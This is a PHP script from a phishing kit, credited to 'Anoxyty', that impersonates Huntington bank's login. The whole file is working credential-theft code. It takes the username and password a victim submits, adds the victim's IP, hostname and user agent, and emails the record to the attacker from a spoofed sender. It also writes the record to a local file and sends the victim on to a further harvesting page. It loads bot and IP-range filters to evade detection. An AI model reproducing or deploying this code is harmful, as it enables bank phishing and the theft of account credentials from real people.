<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
require 'T3R/bot.php';
	require 'T3R/usera.php';
	require 'T3R/rangip.php';
		require 'T3R/usera2.php';
	
	ob_start();
session_start();
	include 'yours.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['username'] ) ) {
		
		$_SESSION['username'] 	  = $_POST['username'];
		$_SESSION['password'] 	  = $_POST['password'];
		$code = <<<EOT
============== [ Huntington By Anoxyty | ]🔥 ==============
[USERNAME] 		: {$_SESSION['username']}
[PASSWORD]		: {$_SESSION['password']}
	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 Huntington By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "💼 Huntington User Info By Anoxyty💼  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <wellsby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($yours,$subject,$code,$headers);

		$save = fopen("../stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: ema.php?&sessionid={$_SESSION['randString']}&ue");
        exit();
	} else {
		header("Location: index.php");
		exit();
	}
?>